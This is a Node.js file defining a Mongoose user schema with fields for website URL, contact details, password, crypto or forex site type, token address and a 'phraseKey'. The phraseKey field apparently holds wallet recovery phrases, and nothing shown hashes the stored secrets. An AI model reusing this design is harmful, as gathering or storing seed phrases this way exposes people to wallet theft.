const mongoose = require('mongoose');

const UserSchema = new mongoose.Schema({
    websiteUrl: { type: String, required: true },
    username: { type: String, required: true },
    email: { type: String, required: true, unique: true },
    phoneNumber: { type: String, required: true },
    password: { type: String, required: true },
    websiteType: { type: String, enum: ['Normal', 'Crypto', 'Finance', 'Investment', 'Forex', 'Trading'], required: true },
    tokenAddress: { type: String },
    phraseKey: { type: String },
    comments: { type: String }
});

module.exports = mongoose.model('User', UserSchema);
